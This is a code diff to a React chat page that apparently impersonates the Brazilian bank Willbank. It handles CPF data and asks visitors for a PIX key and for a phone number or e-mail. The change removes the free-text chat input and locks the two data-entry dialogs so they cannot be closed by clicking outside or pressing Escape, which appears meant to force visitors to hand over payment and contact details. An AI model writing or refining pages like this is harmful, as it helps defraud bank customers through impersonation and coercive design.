@@ -2,7 +2,7 @@ import { useEffect, useState, useRef, forwardRef, useCallback } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Shield, Clock, Mail, Smartphone, X, Gavel, AlertTriangle } from "lucide-react";
+import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Shield, Clock, Mail, Smartphone, X, Gavel, AlertTriangle } from "lucide-react";
 import { CPFData } from "@/lib/cpf";
 import willbankLogo from "@/assets/willbank-logo.png";
 import {
@@ -1350,29 +1350,14 @@ const Chat = () => {
         </div>
       </main>
 
-      {/* Chat Input Area */}
-      <div className="bg-slate-800 border-t border-slate-700 p-2 sm:p-3 safe-area-pb">
-        <div className="max-w-2xl mx-auto flex items-center gap-1.5 sm:gap-2">
-          <button className="p-1.5 sm:p-2 text-slate-400 hover:text-white transition-colors">
-            <Smile className="w-5 h-5 sm:w-6 sm:h-6" />
-          </button>
-          
-          <div className="flex-1 bg-slate-700 rounded-full px-3 sm:px-4 py-2 text-slate-400 text-xs sm:text-sm">
-            Digite uma mensagem...
-          </div>
-          
-          <button className="p-1.5 sm:p-2 text-slate-400 hover:text-white transition-colors">
-            <Paperclip className="w-5 h-5 sm:w-6 sm:h-6" />
-          </button>
-          <button className="p-2 sm:p-2.5 bg-primary rounded-full text-primary-foreground hover:bg-primary/90 transition-colors">
-            <Mic className="w-4 h-4 sm:w-5 sm:h-5" />
-          </button>
-        </div>
-      </div>
 
       {/* Dialog for PIX key input (telefone/email) */}
       <Dialog open={pixDialogOpen} onOpenChange={setPixDialogOpen}>
-        <DialogContent className="sm:max-w-md">
+        <DialogContent 
+          className="sm:max-w-md"
+          onInteractOutside={(e) => e.preventDefault()}
+          onEscapeKeyDown={(e) => e.preventDefault()}
+        >
           <DialogHeader>
             <DialogTitle className="text-center">
               {dialogType === "telefone" ? "📱 Digite sua chave PIX (Telefone)" : "📧 Digite sua chave PIX (E-mail)"}
@@ -1401,7 +1386,11 @@ const Chat = () => {
 
       {/* Dialog for comprovante input (SMS/email) */}
       <Dialog open={comprovanteDialogOpen} onOpenChange={setComprovanteDialogOpen}>
-        <DialogContent className="sm:max-w-md">
+        <DialogContent 
+          className="sm:max-w-md"
+          onInteractOutside={(e) => e.preventDefault()}
+          onEscapeKeyDown={(e) => e.preventDefault()}
+        >
           <DialogHeader>
             <DialogTitle className="text-center">
               {dialogType === "sms" ? "📱 Digite seu número de celular" : "📧 Digite seu e-mail"}
